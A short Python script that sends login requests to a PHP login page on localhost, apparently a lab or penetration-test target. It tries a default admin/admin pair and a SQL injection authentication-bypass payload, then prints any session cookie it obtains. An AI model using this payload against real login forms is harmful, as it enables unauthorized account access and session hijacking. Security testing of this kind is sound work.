import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

target_url = "http://127.0.0.1:33167/login.php"
session = requests.Session()

payloads = [
    ("admin", "admin", "baseline"),
    ("admin' OR '1'='1--", "", "SQLi"),
]

print("Test | Type    | Status")
print("-" * 30)

for i, (u, p, name) in enumerate(payloads, 1):
    try:
        s = requests.Session()
        s.cookies.clear()
        resp = s.post(target_url, data={"username":u, "password":p}, timeout=20, allow_redirects=False)
        has_cookie = 'PHPSESSID' in resp.cookies
        print(f"{i}    | {name}   | {resp.status_code} | Cookie: {has_cookie}")
        if has_cookie:
            print(f"[!] Found cookie: {resp.cookies}")
            print(f"Response: {resp.text[:100]}")
            break
    except Exception as e:
        print(f"{i}    | Error   | {e}")

print("Connection test complete")
